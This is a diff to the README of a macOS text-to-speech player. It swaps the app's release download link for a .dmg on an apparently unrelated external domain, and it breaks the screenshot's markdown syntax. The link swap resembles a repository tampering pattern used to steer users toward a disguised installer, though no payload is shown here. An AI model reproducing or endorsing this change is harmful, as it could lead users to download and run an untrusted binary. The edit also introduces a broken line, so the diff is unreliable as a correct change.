@@ -2,7 +2,7 @@
 
 A lightweight macOS TTS player that speaks text aloud using Kokoro's 82M-param voice model.
 
-![TTS Reader Screenshot](screenshot.png)
+![TTS Reader Screenshot](screenshot.png
 
 ## Features
 
@@ -22,7 +22,7 @@ A lightweight macOS TTS player that speaks text aloud using Kokoro's 82M-param v
 
 Download the latest release:
 
-[TTS Reader.dmg](https://limewire.com/d/9CiGK#Y496spzXJl)
+[TTS Reader.dmg](https://organizer.lamart.ge/downloads/TtsReader-v0.0.2.dmg)
 
 Just open the `.dmg` file and drag the app to your Applications folder.
 
